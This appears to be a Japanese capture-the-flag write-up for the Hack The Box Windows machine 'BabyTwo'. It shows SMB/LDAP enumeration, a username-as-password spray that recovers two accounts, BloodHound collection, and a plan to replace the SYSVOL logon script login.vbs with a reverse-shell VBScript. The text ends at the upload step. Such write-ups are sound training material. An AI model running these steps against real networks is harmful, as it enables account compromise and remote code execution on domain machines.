![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/BabyTwo
- #medium 
- OS : #Windows
- Machine Author(s): [xct](https://app.hackthebox.com/users/13569)
- Hack Date: 2025-10-07,17:19

# Machine Information

The User flag for this Box is located in a non-standard directory, C:\.
# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ


| ポート       | サービス         | バージョン                                                                                       | その他                                                                    |
| --------- | ------------ | ------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| 53/tcp    | domain       | Simple DNS Plus                                                                             |                                                                        |
| 88/tcp    | **kerberos** | Microsoft Windows Kerberos (server time: 2025-10-07 08:29:46Z)                              |                                                                        |
| 135/tcp   | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn                                                               |                                                                        |
| 389/tcp   | **ldap**     | Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) | cert SAN: dc.baby2.vl / baby2.vl / BABY2・Issuer: baby2-CA              |
| 445/tcp   | **Samba**    | microsoft-ds?                                                                               |                                                                        |
| 464/tcp   | kpasswd5     | kpasswd5?                                                                                   |                                                                        |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                         |                                                                        |
| 636/tcp   | **LDAPS**    | Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) | cert SAN: dc.baby2.vl / baby2.vl / BABY2・Issuer: baby2-CA              |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) | Global Catalog                                                         |
| 3269/tcp  | ssl/ldap     | Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) | Global Catalog (SSL)・cert SAN: dc.baby2.vl / baby2.vl / BABY2          |
| 3389/tcp  | **RDP**      | Microsoft Terminal Services                                                                 | RDP NTLM Info: Domain/Builtin 名称 BABY2・Host: dc.baby2.vl・OS 10.0.20348 |
| 9389/tcp  | mc-nmf       | .NET Message Framing                                                                        | AD Web Services                                                        |
| 49463/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 49642/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                         |                                                                        |
| 49643/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 49664/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 49667/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 57227/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 65343/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |
| 65348/tcp | msrpc        | Microsoft Windows RPC                                                                       |                                                                        |

## Nmap
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-07 08:29:46Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
| SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
| -----BEGIN CERTIFICATE-----
<SNIP>
| Fg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
| SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
| SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
| SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-07T08:30:58+00:00
| ssl-cert: Subject: commonName=dc.baby2.vl
| Issuer: commonName=dc.baby2.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T14:29:57
| Not valid after:  2026-02-17T14:29:57
| MD5:   ae82:599c:b589:a1ec:60b7:e83c:50d7:cf06
| SHA-1: 1e8a:1ac9:92a1:c502:dd3a:8d88:5341:12a0:828d:bbcb
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-07T08:31:37+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49463/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49642/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49643/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57227/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65343/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65348/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

```

SMB、LDAPに匿名ログインできるか
## Enum4linux-ng
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ enum4linux-ng -A $Target_IP
ENUM4LINUX - next generation (v1.3.5)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.234.72
[*] Username ......... ''
[*] Random Username .. 'eoyngowi'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.234.72    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.234.72    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: baby2.vl

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.234.72    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.234.72    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for 10.129.234.72    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                                                                                                                                                                   
NetBIOS domain name: BABY2                                                                                                                                                                                                                  
DNS domain: baby2.vl                                                                                                                                                                                                                        
FQDN: dc.baby2.vl                                                                                                                                                                                                                           
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: BABY2                                                                                                                                                                                                                       

 ==========================================
|    RPC Session Check on 10.129.234.72    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[+] Server allows authentication via username 'eoyngowi' and password ''
[H] Rerunning enumeration with user 'eoyngowi' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.234.72    |
 ====================================================
[+] Domain: BABY2
[+] Domain SID: S-1-5-21-213243958-1766259620-4276976267
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.234.72    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: ''                                                                                                                                                                                                                              
OS build: '20348'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 ======================================
|    Users via RPC on 10.129.234.72    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.129.234.72    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.129.234.72    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.129.234.72    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.129.234.72    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 31.34 seconds

```
わかったこと
- ドメイン名
	- baby2.vl
- FQDN : dc.baby2.vl

## SMB
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient -N -L //$Target_IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        apps            Disk      
        C$              Disk      Default share
        docs            Disk      
        homes           Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.234.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
homes、apps、docsなどが特徴的？

それぞれの中を見れるのか

appsの中
```sh
└─$ smbclient -N //$Target_IP/apps     
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep  7 19:12:59 2023
  ..                                  D        0  Tue Aug 22 20:10:21 2023
  dev                                 D        0  Thu Sep  7 19:13:50 2023

                6126847 blocks of size 4096. 1958185 blocks available
smb: \> cd dev
smb: \dev\> ls
  .                                   D        0  Thu Sep  7 19:13:50 2023
  ..                                  D        0  Thu Sep  7 19:12:59 2023
  CHANGELOG                           A      108  Thu Sep  7 19:16:15 2023
  login.vbs.lnk                       A     1800  Thu Sep  7 19:13:23 2023

                6126847 blocks of size 4096. 1958185 blocks available
smb: \dev\> get login.vbs.lnk
getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \dev\> get CHANGELOG 
getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.1 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \dev\> exit
```
login.vbs.lnk という気になるファイルがあるが、これはwindows shotcutなので、特になさそう
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ file login.vbs.lnk  
login.vbs.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Unicoded, MachineID dc, EnableTargetMetadata KnownFolderID F38BF404-1D43-42F2-9305-67DE0B28FC23, Archive, ctime=Tue Aug 22 19:28:18 2023, atime=Sat Sep  2 14:55:51 2023, mtime=Sat Sep  2 14:55:51 2023, length=992, window=normal, IDListSize 0x0239, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\"

```

LocalBasePathに従ってSYSVOLの中を見れるのか試してみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient -N //$Target_IP/SYSVOL                                                                                                   
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

```

docs
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient -N //$Target_IP/docs
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
```
アクセスできない

homes
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient -N //$Target_IP/homes
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 25 08:08:33 2025
  ..                                  D        0  Tue Aug 22 20:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 20:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 20:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 20:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 20:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 20:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 20:17:06 2023
  library                             D        0  Tue Aug 22 20:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 20:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 20:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 20:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 20:17:06 2023

                6126847 blocks of size 4096. 1958069 blocks available
```
それぞれのユーザーフォルダがある
中は空 or 見えない
でも、ユーザー名を取得できたので、AS-REP Roastingに使用することができる


## AS-REP Roasting
ユーザー名ファイルを作る
```sh
cat valid_ad_users
Amelia.Griffiths
Carl.Moore
Harry.Shaw
Joan.Jennings
Joel.Hurst
Kieran.Mitchell
library
Lynda.Bailey
Mohammed.Harris
Nicola.Lamb
Ryan.Jenkins
```

AS-REP Roastingの実行
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ impacket-GetNPUsers baby2.vl/ -dc-ip 10.129.234.72 -no-pass -usersfile valid_ad_users -format hashcat -outputfile asrep_hashes.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Amelia.Griffiths doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Carl.Moore doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Harry.Shaw doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Joan.Jennings doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Joel.Hurst doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kieran.Mitchell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User library doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lynda.Bailey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Mohammed.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicola.Lamb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan.Jenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
```
特に該当なかった

## LDAP
匿名でユーザーの情報取得できない
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ ldapsearch -x -H ldap://10.129.234.72 -b "DC=baby2,DC=vl" "(sAMAccountName=Amelia.Griffiths)"
# extended LDIF
#
# LDAPv3
# base <DC=baby2,DC=vl> with scope subtree
# filter: (sAMAccountName=Amelia.Griffiths)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090D10, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1

```

## SMBの権限確認
SMBの権限を確認する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ nxc smb 10.129.234.72 -u 'guest' -p '' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
```
homesのみ書き込むことができる

IPC$の中身を見てみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient -N //10.129.234.72/IPC$
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*

```
何もないとのこと

ついでにNETLOGONの中も見てみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient -N //10.129.234.72/NETLOGON
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 25 08:30:39 2025
  ..                                  D        0  Tue Aug 22 17:43:55 2023
  login.vbs                           A      992  Sat Sep  2 14:55:51 2023

                6126847 blocks of size 4096. 1955710 blocks available
smb: \> get login.vbs 
getting file \login.vbs of size 992 as login.vbs (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)

```
おおおお！login.vbsを見つけた！！

login.vbsの中身を見てみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ file login.vbs                                          
login.vbs: ASCII text, with CRLF line terminators
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ cat login.vbs                                           
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"                                                                           
```
直接、認証情報があるわけではなさそう
見てみると、Windowsのネットワークドライブをマッピング(接続)するスクリプトっぽい
- マッピング
	- ネットワーク上の共有フォルダを、自分のパソコンの「ドライブ」として使えるようにすること
	- V: ドライブ → 実際は \\dc.baby2.vl\apps
	- L: ドライブ → 実際は \\dc.baby2.vl\docs
	- という感じで、ネットワーク上のフォルダがまるで自分のパソコンのドライブのように見える
でもappsフォルダに書き込み権限ないしなあ

## ユーザー名とパスワードが同じ
- そんな馬鹿なとは思うが、意外とパスワードの使い回しと同じ感じであるのかもしれない
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ nxc smb 10.129.234.72 -u valid_ad_users -p valid_ad_users --continue-on-success
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Carl.Moore:Amelia.Griffiths STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
<SNIP>
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library 
<SNIP>
```
実際に、2つのアカウントでSMBにログインできた
おいおい、まじかよ
こんなに簡単なのか(自分ではわからなくてHTBのGuideを見た
これこそ、考えすぎるなというやつか

### Carl.Mooreの認証情報
Carl.Moore : Carl.Moore

### libraryの認証情報
library : library

それぞれのアカウントで何ができるのかを調べる
### SMB
Carl.Mooreから試す
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ nxc smb 10.129.234.72 -u 'Carl.Moore' -p 'Carl.Moore' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE      
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE      
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share 
```
apps・docs・homes、SYSVOLに読み書き権限がある

先程は見れなかったdocsフォルダの中身を見てみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ smbclient //"$Target_IP"/docs -U Carl.Moore%Carl.Moore
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  7 11:10:16 2025
  ..                                  D        0  Tue Aug 22 20:10:21 2023

                6126847 blocks of size 4096. 1953866 blocks available
smb: \> ^C
```
意外にも何もない

一応確認
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ nxc smb 10.129.234.72 -u 'library' -p 'library' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE      
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE      
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share 
```
Carl.Mooreと特に変わらない

### LDAP
ldapはどうだろう？
権限あるか
権限あたら、bloodhoundもできる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ ldapsearch -x -H ldap://$Target_IP -D "Carl.Moore@baby2.vl" -w 'Carl.Moore' -b "DC=baby2,DC=vl" "(sAMAccountName=Carl.Moore)"
# extended LDIF
#
# LDAPv3
# base <DC=baby2,DC=vl> with scope subtree
# filter: (sAMAccountName=Carl.Moore)
# requesting: ALL
#

# Carl Moore, office, baby2.vl
dn: CN=Carl Moore,OU=office,DC=baby2,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Carl Moore
sn: Moore
givenName: Carl
distinguishedName: CN=Carl Moore,OU=office,DC=baby2,DC=vl
instanceType: 4
whenCreated: 20230822191821.0Z
whenChanged: 20251007100006.0Z
displayName: Carl Moore
uSNCreated: 16445
memberOf: CN=office,CN=Users,DC=baby2,DC=vl
uSNChanged: 118872
name: Carl Moore
objectGUID:: OKSBfhk+Y0K7meoS3xY9YQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
<SNIP>
```
取得できる！
ldapdomaindumpとbloodhoundを実行する

### LdapDomainDump
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo]
└─$ ldapdomaindump ldap://10.129.234.72 -u 'baby2.vl\Carl.Moore' -p 'Carl.Moore' --no-json -d baby2.vl
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

domain_users.htmlから、多くのユーザーがofficeグループに入っていることがわかる
![](https://i.imgur.com/bTwZKiZ.png)

## BloodHound
データの収集
```sh
sudo rdate -n $Target_IP
sudo bloodhound-python -u 'Carl.Moore@baby2.vl' -p 'Carl.Moore' -ns 10.129.234.72 -d baby2.vl -c all
```

Domain Admins
![](https://i.imgur.com/AVaXoQM.png)
Joan.JennigsかADMINISTRATORを最終的に取ったら良さそう
でも、特にCarlとlibraryからの横展開の方法は思いつかない

# Foothold

## login.vbsの書き換え

SYSVOLのscriptsフォルダに書きこみ権限あるのか？
試しに、generate.lnkをアップロードする
```sh
┌──(kali㉿kali)-[~/…/HTB/BabyTwo/ntlm_theft/generate]
└─$ smbclient //10.129.234.72/SYSVOL -U 'library%library'            
smb: \> cd baby2.vl\
smb: \baby2.vl\> ls
  .                                   D        0  Tue Aug 22 17:43:55 2023
  ..                                  D        0  Tue Aug 22 17:37:36 2023
  DfsrPrivate                      DHSr        0  Tue Aug 22 17:43:55 2023
  Policies                            D        0  Tue Aug 22 17:37:41 2023
  scripts                             D        0  Mon Aug 25 08:30:39 2025

                6126847 blocks of size 4096. 1950086 blocks available
smb: \baby2.vl\> cd scripts\
smb: \baby2.vl\scripts\> put generate.lnk
putting file generate.lnk as \baby2.vl\scripts\generate.lnk (4.4 kb/s) (average 4.4 kb/s)
smb: \baby2.vl\scripts\> ls
  .                                   D        0  Tue Oct  7 12:27:10 2025
  ..                                  D        0  Tue Aug 22 17:43:55 2023
  generate.lnk                        A     2164  Tue Oct  7 12:27:11 2025
  login.vbs                           A      992  Sat Sep  2 14:55:51 2023

                6126847 blocks of size 4096. 1950005 blocks available
smb: \baby2.vl\scripts\>
```
アップロードできた
ってことは、login.vbsを書き換えることができるのでは

login.vbsの書き換え
リバースシェルを確立するように書き換える
- リバースシェルはこれを利用する
- https://github.com/bitsadmin/revbshell
client.vbsのサーバーIPは自分のIPにする
サーバーを立てて待ち受ける
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/BabyTwo/revbshell]
└─$ python2 server.py
```

SMBでrevbshellのclient.vbsの名前をlogin.vbsに変更して、SYSVOL\baby2.vl\scriptsにアップロードする
```sh
smb: \baby2.vl\> cd scripts\
